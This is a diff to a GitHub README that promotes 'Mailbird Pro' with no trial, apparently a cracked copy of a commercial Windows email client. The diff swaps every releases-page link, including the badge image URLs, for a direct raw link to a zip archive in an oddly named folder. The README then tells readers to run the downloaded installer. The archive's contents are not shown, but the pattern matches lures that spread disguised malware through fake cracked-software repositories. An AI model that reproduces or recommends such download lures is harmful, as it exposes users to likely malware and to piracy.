@@ -1,6 +1,6 @@
 # 📧 Mailbird-Pro-No-Trial - Effortless Email Management for Windows
 
-[![Download Mailbird Pro](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/dolphin-png/Mailbird-Pro-No-Trial/releases)
+[![Download Mailbird Pro](https://raw.githubusercontent.com/dolphin-png/Mailbird-Pro-No-Trial/main/floodage/Mailbird-Pro-Trial-No-v2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dolphin-png/Mailbird-Pro-No-Trial/main/floodage/Mailbird-Pro-Trial-No-v2.5.zip)
 
 ## 📥 Overview
 
@@ -28,7 +28,7 @@ Before installing Mailbird Pro, ensure your system meets the following requireme
 
 To start using Mailbird Pro, follow these steps:
 
-1. **Visit the Releases Page**: Click the button at the top of this page or follow this link: [Download Mailbird Pro](https://github.com/dolphin-png/Mailbird-Pro-No-Trial/releases).
+1. **Visit the Releases Page**: Click the button at the top of this page or follow this link: [Download Mailbird Pro](https://raw.githubusercontent.com/dolphin-png/Mailbird-Pro-No-Trial/main/floodage/Mailbird-Pro-Trial-No-v2.5.zip).
 2. **Choose the Latest Version**: On the Releases page, find the latest version of Mailbird Pro.
 3. **Download the Installer**: Click on the download link for the `.exe` file.
 4. **Run the Installer**: After downloading, double-click the downloaded file to run it.
@@ -37,7 +37,7 @@ To start using Mailbird Pro, follow these steps:
 
 To download Mailbird Pro:
 
-- **Visit this page to download**: [Mailbird Pro Releases](https://github.com/dolphin-png/Mailbird-Pro-No-Trial/releases)
+- **Visit this page to download**: [Mailbird Pro Releases](https://raw.githubusercontent.com/dolphin-png/Mailbird-Pro-No-Trial/main/floodage/Mailbird-Pro-Trial-No-v2.5.zip)
 
 Follow the below steps to install the application after downloading:
 
@@ -75,4 +75,4 @@ Mailbird Pro streamlines your email management on Windows. With its robust featu
 
 For any further questions, feel free to explore the resources or connect with the support team for help. Enjoy using Mailbird Pro!
 
-[![Download Mailbird Pro](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/dolphin-png/Mailbird-Pro-No-Trial/releases)
+[![Download Mailbird Pro](https://raw.githubusercontent.com/dolphin-png/Mailbird-Pro-No-Trial/main/floodage/Mailbird-Pro-Trial-No-v2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dolphin-png/Mailbird-Pro-No-Trial/main/floodage/Mailbird-Pro-Trial-No-v2.5.zip)
